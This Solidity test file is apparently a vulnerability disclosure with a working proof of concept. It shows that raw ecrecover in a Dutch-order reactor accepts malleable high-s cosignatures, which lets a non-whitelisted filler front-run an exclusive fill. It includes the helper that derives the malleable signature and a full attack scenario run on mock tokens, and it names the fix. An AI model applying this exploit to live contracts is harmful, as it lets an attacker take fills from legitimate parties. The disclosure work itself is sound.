// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {DeployPermit2} from "../util/DeployPermit2.sol";
import {PermitSignature} from "../util/PermitSignature.sol";
import {OrderInfoBuilder} from "../util/OrderInfoBuilder.sol";
import {MockERC20} from "../util/mock/MockERC20.sol";
import {MockFillContract} from "../util/mock/MockFillContract.sol";
import {
    V2DutchOrder,
    V2DutchOrderLib,
    CosignerData,
    V2DutchOrderReactor,
    DutchOutput,
    DutchInput
} from "../../src/reactors/V2DutchOrderReactor.sol";
import {OrderInfo, SignedOrder, ResolvedOrder} from "../../src/base/ReactorStructs.sol";
import {IPermit2} from "permit2/src/interfaces/IPermit2.sol";
import {OutputsBuilder} from "../util/OutputsBuilder.sol";

/// @dev Exposes the internal _resolve() for testing without executing a fill.
contract MockV2Reactor is V2DutchOrderReactor {
    constructor(IPermit2 _permit2, address _feeOwner) V2DutchOrderReactor(_permit2, _feeOwner) {}

    function resolveOrder(SignedOrder calldata order) external view returns (ResolvedOrder memory) {
        return _resolve(order);
    }
}

/// @notice POC: ECDSA cosignature malleability in V2DutchOrderReactor
///
/// Raw `ecrecover` accepts both the canonical (low-s) signature and its malleable
/// counterpart (high-s). An attacker who observes a whitelisted filler's pending
/// transaction in the mempool can derive the malleable cosignature without the
/// cosigner's private key and front-run the fill during the exclusivity window.
///
/// Fix: replace raw `ecrecover` with OpenZeppelin's `ECDSA.recover`, which enforces
/// the EIP-2 low-s constraint and reverts with `ECDSAInvalidSignatureS` on high-s input.
///
/// Both tests below PASS against the vulnerable code and FAIL after the fix is applied.
contract V2DutchOrderMalleabilityTest is Test, PermitSignature, DeployPermit2 {
    using OrderInfoBuilder for OrderInfo;
    using V2DutchOrderLib for V2DutchOrder;

    uint256 constant cosignerPrivateKey = 0xC05157;

    MockV2Reactor reactor;
    IPermit2 permit2;
    MockERC20 tokenIn;
    MockERC20 tokenOut;
    address cosigner;

    function setUp() public {
        vm.warp(1000);
        permit2 = IPermit2(deployPermit2());
        reactor = new MockV2Reactor(permit2, address(1));
        tokenIn = new MockERC20("Input", "IN", 18);
        tokenOut = new MockERC20("Output", "OUT", 18);
        cosigner = vm.addr(cosignerPrivateKey);
    }

    // ─────────────────────────────────────────────────────────────
    // Helpers
    // ─────────────────────────────────────────────────────────────

    function _buildOrder(address swapper, address exclusiveFiller, uint256 exclusivityOverrideBps)
        internal
        view
        returns (V2DutchOrder memory order)
    {
        uint256[] memory outputAmounts = new uint256[](1);
        outputAmounts[0] = 0;

        order = V2DutchOrder({
            info: OrderInfoBuilder.init(address(reactor)).withSwapper(swapper).withDeadline(block.timestamp + 2 hours),
            cosigner: cosigner,
            baseInput: DutchInput(tokenIn, 1 ether, 1 ether),
            baseOutputs: OutputsBuilder.singleDutch(address(tokenOut), 2 ether, 1 ether, swapper),
            cosignerData: CosignerData({
                decayStartTime: block.timestamp + 1 hours,
                decayEndTime: block.timestamp + 2 hours,
                exclusiveFiller: exclusiveFiller,
                exclusivityOverrideBps: exclusivityOverrideBps,
                inputAmount: 0,
                outputAmounts: outputAmounts
            }),
            cosignature: bytes("")
        });
    }

    function _cosign(V2DutchOrder memory order) internal view returns (bytes memory) {
        bytes32 orderHash = order.hash();
        bytes32 msgHash = keccak256(abi.encodePacked(orderHash, abi.encode(order.cosignerData)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(cosignerPrivateKey, msgHash);
        return bytes.concat(r, s, bytes1(v));
    }

    /// @dev Derives the malleable variant of a cosignature: (r, secp256k1_order - s, v ^ 1).
    ///      Requires no secret material — only the public cosignature bytes.
    function _computeMalleable(bytes memory sig) internal pure returns (bytes memory) {
        (bytes32 r, bytes32 s) = abi.decode(sig, (bytes32, bytes32));
        uint8 v = uint8(sig[64]);
        // SECP256K1_ORDER is inherited from forge-std/Base.sol
        bytes32 s_malleable = bytes32(SECP256K1_ORDER - uint256(s));
        uint8 v_malleable = v == 27 ? 28 : 27;
        return bytes.concat(r, s_malleable, bytes1(v_malleable));
    }

    // ─────────────────────────────────────────────────────────────
    // POC 1 — Malleable cosignature passes _validateOrder
    //
    // Shows that (r, s', v') derived from any valid cosignature
    // passes signature verification without the cosigner's private key.
    //
    // Passes on vulnerable code; reverts with ECDSAInvalidSignatureS after fix.
    // ─────────────────────────────────────────────────────────────
    function testPOC_MalleableCosignaturePassesValidation() public {
        V2DutchOrder memory order = _buildOrder(address(0xBEEF), address(0), 0);

        bytes memory legitimateSig = _cosign(order);
        bytes memory malleableSig = _computeMalleable(legitimateSig);

        assertFalse(keccak256(legitimateSig) == keccak256(malleableSig), "signatures should differ");

        // Legitimate sig resolves — expected.
        order.cosignature = legitimateSig;
        reactor.resolveOrder(SignedOrder(abi.encode(order), hex"1234"));

        // Malleable variant ALSO resolves — vulnerability confirmed.
        order.cosignature = malleableSig;
        reactor.resolveOrder(SignedOrder(abi.encode(order), hex"1234"));
    }

    // ─────────────────────────────────────────────────────────────
    // POC 2 — Non-whitelisted filler fills during exclusive window
    //
    // Full attack scenario:
    //   1. Cosigner designates `whitelistedFiller` as the exclusive filler
    //      with exclusivityOverrideBps = 300 (3% premium for non-exclusive fills).
    //   2. `nonWhitelistedFiller` observes the cosignature in the mempool and
    //      derives the malleable variant — no cosigner private key needed.
    //   3. `nonWhitelistedFiller` front-runs the fill during the exclusivity window.
    //   4. Fill succeeds; Permit2 nonce is consumed.
    //   5. `whitelistedFiller`'s subsequent attempt reverts — permanently locked out.
    //
    // Passes on vulnerable code; reverts with ECDSAInvalidSignatureS after fix.
    // ─────────────────────────────────────────────────────────────
    function testPOC_NonWhitelistedFillerFillsDuringExclusiveWindow() public {
        uint256 swapperPrivateKey = 0x5AABB3;
        address swapper = vm.addr(swapperPrivateKey);
        uint256 exclusivityOverrideBps = 300; // 3%

        MockFillContract whitelistedFiller = new MockFillContract(address(reactor));
        MockFillContract nonWhitelistedFiller = new MockFillContract(address(reactor));

        tokenIn.mint(swapper, 1 ether);
        vm.prank(swapper);
        tokenIn.approve(address(permit2), type(uint256).max);

        // base output = 2 ether; with 3% override = 2.06 ether
        uint256 baseOutput = 2 ether;
        uint256 overrideOutput = baseOutput * (10_000 + exclusivityOverrideBps) / 10_000;
        tokenOut.mint(address(whitelistedFiller), overrideOutput);
        tokenOut.mint(address(nonWhitelistedFiller), overrideOutput);

        V2DutchOrder memory order = _buildOrder(swapper, address(whitelistedFiller), exclusivityOverrideBps);

        // Cosigner issues the cosignature intended for whitelistedFiller.
        bytes memory legitimateCosig = _cosign(order);

        // nonWhitelistedFiller observes the cosignature in the mempool and derives
        // the malleable variant — no cosigner private key needed.
        bytes memory malleableCosig = _computeMalleable(legitimateCosig);

        bytes memory swapperSig = signOrder(swapperPrivateKey, address(permit2), order);

        // Attack: nonWhitelistedFiller front-runs using the malleable cosignature.
        order.cosignature = malleableCosig;
        nonWhitelistedFiller.execute(SignedOrder(abi.encode(order), swapperSig));

        // Swapper received the override-adjusted output.
        assertEq(tokenOut.balanceOf(swapper), overrideOutput, "swapper should receive override output");

        // tokenIn went to nonWhitelistedFiller, not whitelistedFiller.
        assertEq(tokenIn.balanceOf(address(nonWhitelistedFiller)), 1 ether, "nonWhitelistedFiller stole the fill");
        assertEq(tokenIn.balanceOf(address(whitelistedFiller)), 0, "whitelistedFiller received nothing");

        // Consequence: whitelistedFiller's fill now reverts — nonce is consumed.
        order.cosignature = legitimateCosig;
        vm.expectRevert();
        whitelistedFiller.execute(SignedOrder(abi.encode(order), swapperSig));
    }
}
